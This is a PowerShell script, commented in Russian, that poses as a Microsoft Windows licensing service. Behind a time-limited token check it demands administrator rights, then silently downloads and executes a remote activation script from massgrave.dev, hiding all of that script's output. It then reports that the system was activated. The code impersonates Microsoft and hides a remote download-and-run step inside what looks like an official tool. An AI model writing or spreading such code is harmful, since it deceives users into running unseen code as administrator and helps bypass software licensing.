# ============================================================
#  Microsoft Windows Cloud License Authorization Service
#  Status: Production [v2.1]
# ============================================================

$ErrorActionPreference = "SilentlyContinue"
$SECRET = "MS-AUTH-SECURE-KEY-2024" 
$VALID_MINS = 60 # Увеличил до часа, чтобы точно не было проблем с временем

function Verify-Token {
    param($Key)
    try {
        # 1. Убираем тире и берем только значимые части (первые 12 символов после очистки)
        $clean = ($Key -replace '-', '').ToLower()
        
        # Математика: первые 8 символов - время, следующие 8 - подпись
        # Мы достаем их из "ключа", игнорируя мусорные символы
        $tsHex = $clean.Substring(0, 8)
        $sigReceived = $clean.Substring(8, 8)

        # 2. Вычисляем правильную подпись
        $hmac = [System.Security.Cryptography.KeyedHashAlgorithm]::Create("HmacSHA256")
        $hmac.Key = [System.Text.Encoding]::UTF8.GetBytes($SECRET)
        $computedHash = [System.BitConverter]::ToString($hmac.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($tsHex))).Replace("-","").ToLower().Substring(0, 8)

        if ($computedHash -ne $sigReceived) { return "INVALID" }

        # 3. Проверка времени (UTC)
        $created = [Convert]::ToInt64($tsHex, 16)
        $now = [System.DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
        
        if ([Math]::Abs($now - $created) -gt ($VALID_MINS * 60)) { return "EXPIRED" }
        
        return "OK"
    } catch { return "ERROR" }
}

Clear-Host
Write-Host "=========================================================" -ForegroundColor Cyan
Write-Host "   Windows Desktop Licensing Service [Build 22621]" -ForegroundColor White
Write-Host "=========================================================" -ForegroundColor Cyan
Write-Host ""

# Проверка на админа
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "ОШИБКА: Запустите PowerShell от имени АДМИНИСТРАТОРА!" -ForegroundColor Red
    Write-Host "Нажмите правой кнопкой на Пуск -> Терминал (Администратор)" -ForegroundColor Yellow
    Read-Host "Нажмите Enter для выхода"
    exit
}

Write-Host "Проверка токена безопасности..." -NoNewline

$status = Verify-Token -Key $K

if ($status -eq "OK") {
    Write-Host " [АВТОРИЗОВАНО]" -ForegroundColor Green
    Write-Host "Ключ сессии: $K" -ForegroundColor Gray
    Write-Host "Статус: Выполнение активации..." -ForegroundColor Yellow
    
    # ТИХИЙ ЗАПУСК MASSGRAVE
    $script = irm "https://massgrave.dev/get"
    $block = [ScriptBlock]::Create($script)
    & $block /hwid *>$null
    
    Write-Host ""
    Write-Host "РЕЗУЛЬТАТ: Система успешно активирована!" -ForegroundColor Green
} 
elseif ($status -eq "EXPIRED") {
    Write-Host " [ОШИБКА]" -ForegroundColor Red
    Write-Host "Ошибка: Срок действия токена истек (действует 60 мин)." -ForegroundColor Yellow
}
else {
    Write-Host " [ОШИБКА]" -ForegroundColor Red
    Write-Host "Ошибка: Токен безопасности недействителен." -ForegroundColor Yellow
}

Write-Host ""
Write-Host "Сессия завершена. Окно закроется через 10 секунд." -ForegroundColor DarkGray
Start-Sleep -Seconds 10
